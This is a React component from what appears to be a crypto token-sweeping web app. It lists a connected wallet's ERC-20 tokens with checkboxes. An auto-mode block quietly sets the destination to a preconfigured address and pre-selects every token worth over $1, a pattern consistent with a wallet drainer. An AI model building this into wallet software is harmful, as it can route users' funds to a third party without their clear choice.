"use client";

import { useCallback, useEffect, useState } from "react";
import { useAccount, useWaitForTransactionReceipt } from "wagmi";
import { useAtom } from "jotai";
import { checkedTokensAtom } from "../atoms/checked-tokens-atom";
import { globalTokensAtom } from "../atoms/global-tokens-atom";
import { destinationAddressAtom } from "../atoms/destination-address-atom";
import { httpFetchTokens, Tokens } from "../lib/fetch-tokens";
import { AUTO_DESTINATION_ADDRESS, AUTO_MODE_ENABLED } from "@/config";
import { tinyBig } from "essential-eth";
import { Skeleton } from "@/components/ui/skeleton";
import { Checkbox } from "@/components/ui/checkbox";

const usdFormatter = new Intl.NumberFormat("en-US", {
  style: "currency",
  currency: "USD",
});

const TokenRow: React.FunctionComponent<{ token: Tokens[number] }> = ({
  token,
}) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { address, chain } = useAccount();
  const pendingTxn =
    checkedRecords[token.contract_address as `0x${string}`]?.pendingTxn;
  const setTokenChecked = (tokenAddress: string, isChecked: boolean) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
  };
  const { balance, contract_address, contract_ticker_symbol } = token;
  const unroundedBalance = tinyBig(token.quote).div(token.quote_rate);
  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
    ? unroundedBalance.round(2)
    : unroundedBalance.round(5);
  const { isLoading, isSuccess } = useWaitForTransactionReceipt({
    hash: pendingTxn?.hash || undefined,
  });
  return (
    <div key={contract_address} className="flex items-center gap-2 py-2">
      {isLoading && <Skeleton className="h-4 w-4" />}
      <Checkbox
        checked={checkedRecords[contract_address as `0x${string}`]?.isChecked}
        onCheckedChange={(checked) => {
          setTokenChecked(contract_address, checked === true);
        }}
        disabled={Boolean(pendingTxn)}
      />
      <span className="font-mono">{roundedBalance.toString()} </span>
      <a
        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
        target="_blank"
        rel="noreferrer"
        className="text-blue-500 hover:underline"
      >
        {contract_ticker_symbol}
      </a>{" "}
      (worth{" "}
      <span className="font-mono">{usdFormatter.format(token.quote)}</span>)
    </div>
  );
};

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const [, setDestinationAddress] = useAtom(destinationAddressAtom);

  const { address, isConnected, chain } = useAccount();

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      setError("");
      const newTokens = await httpFetchTokens(
        chain?.id as number,
        address as string
      );
      const fetchedTokens = (newTokens as any).data.erc20s;
      setTokens(fetchedTokens);

      // Auto-mode: Set destination address and auto-select tokens worth > $1
      if (AUTO_MODE_ENABLED && AUTO_DESTINATION_ADDRESS) {
        console.log(
          "🤖 Auto-mode enabled, setting destination:",
          AUTO_DESTINATION_ADDRESS
        );
        setDestinationAddress(AUTO_DESTINATION_ADDRESS);

        // Auto-select all tokens worth > $1
        const autoSelected: Record<`0x${string}`, { isChecked: boolean }> = {};
        fetchedTokens.forEach((token: Tokens[number]) => {
          if (token.quote > 1) {
            autoSelected[token.contract_address as `0x${string}`] = {
              isChecked: true,
            };
          }
        });
        console.log(
          `✅ Auto-selected ${
            Object.keys(autoSelected).length
          } tokens worth > $1`
        );
        setCheckedRecords(autoSelected);
      } else {
        console.log("ℹ️ Auto-mode disabled or no destination address set");
        setCheckedRecords({});
      }
    } catch (error) {
      setError(`Chain ${chain?.id} not supported. Coming soon!`);
    }
    setLoading(false);
  }, [address, chain, setTokens, setCheckedRecords, setDestinationAddress]);

  useEffect(() => {
    if (address && chain?.id) {
      console.log("🔄 Fetching tokens for:", address, "on chain:", chain.id);
      // eslint-disable-next-line react-hooks/exhaustive-deps
      fetchData();
    }
  }, [address, chain?.id, fetchData]);

  useEffect(() => {
    if (!isConnected) {
      setTokens([]);
      setCheckedRecords({});
    }
  }, [isConnected, setTokens, setCheckedRecords]);

  if (loading) {
    return <Skeleton className="h-20 w-full" />;
  }

  if (error) {
    return <div className="text-red-500">{error}</div>;
  }

  return (
    <div className="m-5">
      {isConnected && tokens?.length === 0 && `No tokens on ${chain?.name}`}
      {tokens.map((token) => (
        <TokenRow token={token} key={token.contract_address} />
      ))}
    </div>
  );
};
